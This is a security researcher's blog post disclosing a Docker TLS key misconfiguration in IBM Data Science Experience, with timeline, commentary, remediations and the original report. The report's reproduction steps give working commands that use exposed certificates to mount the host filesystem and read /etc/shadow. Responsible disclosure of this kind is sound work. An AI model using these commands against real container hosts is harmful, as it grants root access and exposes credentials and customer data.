---
title: "IBM Data Science Experience: Whole-Cluster Privilege Escalation Disclosure"
tags: security
---

For the impatient, [click here](#original-report) for the original report.

Media coverage can be found at [The Register](https://www.theregister.co.uk/2017/02/21/ibm_data_science_experience_fixes_docker_security/).

This is a disclosure of a privilege escalation vulnerability I found in the IBM Data Science Experience product, which was patched on Feb 15th, 2017. It was a misconfiguration vulnerability with very severe consequences. In short, they left all the [Docker TLS keys](https://docs.docker.com/engine/security/https/) in the container, which is the same as leaving a jail cell's keys inside the jail cell. I worked with [IBM PSIRT](https://www-03.ibm.com/security/secure-engineering/process.html) staff to address this. Thank you to Marcia at [Zeitgeist Law](https://www.zeitgeist.law/) for helping me think through disclosure issues.

[IBM Data Science Experience](http://datascience.ibm.com/) is an all-in-one data analytics product built on top of [IBM's $300MM investment](https://www-03.ibm.com/press/us/en/pressrelease/49866.wss) into Apache Spark. It touts a seamlessly integrated package of big data analytics tools including Spark, Jupyter notebooks, RStudio, Shiny, and more.

What was at stake:

- Root access across whole compute cluster
- R/W to 100s of TBs of customer data

Conditions required:

- Web browser
- Free trial account

#### Timeline

- January 31st: I went to an event titled "IBM Open Source Analytics & Data Science Experience" where we were told to get accounts and test out the product. I noticed that the Docker containers could run arbitrary code. This was a red flag. When I got home, I poked around and found this bug in half an hour or so.

- February 1st: I emailed the PSIRT team my encrypted write-up.

- February 2nd: Heard back from PSIRT: my issue was assigned an internal advisory ID.

- February 8th: After some radio silence, I sent them an email about my disclosure plans.

- February 9th: PSIRT said that my findings were verified and a fix was in the works by March 31st.

- February 15th: PSIRT said that this issue was patched early. I got added to the new [acknowledgement website](https://www.ibm.com/blogs/psirt/ibm-acknowledgement/).

#### Synopsis

I think that container security will be a big issue for the next 0-3 years. Can containers be used securely and in HIPAA/PCI/HITRUST/etc.-compliant environments? Sure! Just as much as a lot of other software can. But there's [a lot to do to make that happen](https://www.nccgroup.trust/us/our-research/understanding-and-hardening-linux-containers/), and every security control that you need to apply has a compounding `p > 0` of being applied incorrectly. [Secure defaults](https://en.wikipedia.org/wiki/Secure_by_default) can help a lot here, and I think we're getting there.

As per this vulnerability, it's simple enough that reading the Docker tutorials would have been sufficient to find/exploit it. Kudos to the IBM security team for taking this seriously and remediating in two weeks instead of the industry norm of [6 months](https://www.sans.org/reading-room/whitepapers/application/win-friends-remediate-vulnerabilities-34530). Here are just some of the (illegal) things that would have been possible through this exploit:

- Snoop on customers' live internal datasets and engage in insider trading or corporate espionage
- Implement phishing attacks that ask for sensitive data inside the trusted webapp
- Leverage LAN access to break into other internal services
- Bring down entire product for who knows how long

This kind of oversight simply isn't acceptable for such a high-profile and enterprise product; it tells me that their security review process should be more rigorous. There are people far scarier and more capable than me, and if I could find this in half an hour of educated stumbling, what can those people find if they're truly determined? I would like to see some real improvements made by this company moving forward, including:

- Customers should have received a security bulletin for this. I was told that a security bulletin would not be posted for this incident or cloud security incidents in general, but if I were a paying customer, I would absolutely want to hear it from the company itself and not some stupid tech blog.
- Improved transparency in security controls, where data are stored, how data are processed, potential risks to customers, and security best practices for this product. I think [tarsnap](https://www.tarsnap.com/index.html) is great at this, but it may not be a fair comparison given the different use cases.
- A bug bounty: (admittedly, this is partially in self-interest, but) how much is preventing unauthorized access to all of your customers' data worth? Wouldn't a company prefer to shell out a few grand than risk a PR disaster that could cost millions of dollars in lost customers?

#### Shameless plug

I think breaking things is fun, but I usually prefer building things. Feel free to reach out if you want to [work together](https://www.wyc.io/).

#### <a name="original-report"></a>My original report

(some personal information redacted)

```
##############################################################################
Vulnerability Report

    Title: Privilege Escalation due to Misconfigured Docker Swarm Services
    Product: IBM Data Science Experience (http://datascience.ibm.com/)

##############################################################################

Summary
-------
The container's access to the Docker Swarm host API was secured via TLS,
however, the keys to access said API were readily available *in the
container*. As is commonly known, access to the Docker host API may be
trivially leveraged into root access on the host machine.


Affected Products
-----------------
- IBM Data Science Experience (http://datascience.ibm.com/)
- Any other accessible services from its machines


Privileges Required
-------------------
- Public Internet access
- Web browser


Concerns
--------
- Root access to container's host machine and (likely) root access to all
  machines on the entire Spark compute cluster network
- R/W access to any connected stores of customer data including network
  drives, LAN-only services, firewall-protected endpoints, etc.
- Installation of rootkits and/or malicious code to steal sensitive business
  data over time


Reproduction
------------
(1) Enter RStudio Web Environment, and focus the cursor on the command line.
(2) Download and Extract Docker:

    > system("wget https://test.docker.com/builds/Linux/x86_64/docker-1.13.1-rc1.tgz")
    > system("tar -xvzf docker*.tgz")

(3) Use docker binary with existing certificates to obtain root-like access to
    the host using volume mounts. You may need to check/correct the naming of the
    pem files for this to work--I'm not sure that I remembered them correctly:

    > system("DOCKER_API_VERSION=1.22 ./docker/docker -H 172.17.0.1 \
              --tlscacert /certs/ca.pem --tlscert /certs/cert.pem \
              --tlskey /certs/key.pem \
              run -v /:/host debian cat /host/etc/shadow")

    This is as good as root access.


Further Untested Implications
-----------------------------
- If all the other Docker Swarm sockets share the same cryptographic handshake
  and are accessible from the internal network, then root access to this one
  box could be leveraged to root the whole network.
- Users could keep on registering new accounts until they are distributed to
  all or nearly all Spark machines on the network, performing the same root
  privilege escalation.
- If customer data is accessible by all nodes, then through exploitation of
  this vulnerability on a single box, it may be feasible to siphon all
  customer data.
- Any other privilege escalations available after obtaining root on a machine


Recommended Remediations
------------------------
These steps may help, but as always, please ensure that they are filtered
through your knowledge of the system archicture to determine if they would be
truly effective:

Fixes and Improvements:

- Remove security certificates found in `/certs/` on Docker containers and
  refactor application architecture as necessary
- More comprehensive sandboxing for environments where remote code execution
  is expected. While containers have some secure defaults, they are not meant
  for security-centric applications, and container security is something that
  must be aggressive pursued. KVM has a much better security record.
- Ensure separation of customer data within data stores
- Consider solutions like AppArmor and SELinux which offer finer-grained
  controls of access
- Lock down `docker pull` on host
- Use a password-protected and TLS-enabled Docker registry if not already

Clean-up:

- Re-image ALL affected machines. Someone may have found this exploit before I
  did and there may already be installed rootkits or malicious software
  services by attackers
- Assessment of all affected customer data and responsible reporting to the
  affected parties


Email with the Context of this Discovery
----------------------------------------

From: Wayne Chang <wayne@wycd.net>
To: <REDACTED>@us.ibm.com
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Type: multipart/alternative; boundary="_----------=_14859852333597655"
Date: Wed, 01 Feb 2017 16:40:33 -0500
Subject: Security Vulnerability

This is a multi-part message in MIME format.

--_----------=_14859852333597655
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset="utf-8"

Hi <REDACTED>,



It was a pleasure speaking with you today. Thank you for living up to
IBM's steadfast dedication to security.


I think I may have found a security exploit in an IBM product. I was
at an event called "IBM Open Source Analytics & Data Science
Experience" last night in Atlanta, GA, yesterday on 1/31. We were told
to sign up with free accounts and assured that the technology is
secure and reliable.


I conduct routine security and reliability assessments of potential new
software on behalf of my clients, who have very sensitive data security
concerns. My assessments consist of quick checks for common security
mistakes such as incorrectly configured programs and poor separation of
customer data. To my dismay, one of the checks I performed resulted in
the revelation of a privilege escalation[1] vulnerability having serious
potential for an attacker to impact the stability of the product and
safety of customer data. After this discovery, I immediately disengaged
from the affected product and did not pursue the matter any further, and
will not resume access until this issue is addressed.


I believe in secure software, and I absolutely make every effort to work
with vendors such as yourself to address these issues quietly, safely,
and professionally. With respect to responsible disclosure[2], I'm
looking to you for the best way to proceed next. One of the IBM
representatives mentioned that there may be something like a bug
bounty[3]; if such a thing exists, then I'd be interested.


The website suggests that I should use the following form:
https://www-03.ibm.com/security/secure-engineering/report.html
The same IBM representative from the event recently said over email to
do the same.


Is this the best way, or are you able to get me in touch with someone to
more expediently resolve this potential security issue?


Best,

Wayne Chang

Independent Technology Consultant

WYC Technology, LLC

https://wycd.net


Links:

  1. https://en.wikipedia.org/wiki/Privilege_escalation
  2. https://en.wikipedia.org/wiki/Responsible_disclosure
  3. https://en.wikipedia.org/wiki/Bug_bounty_program
```
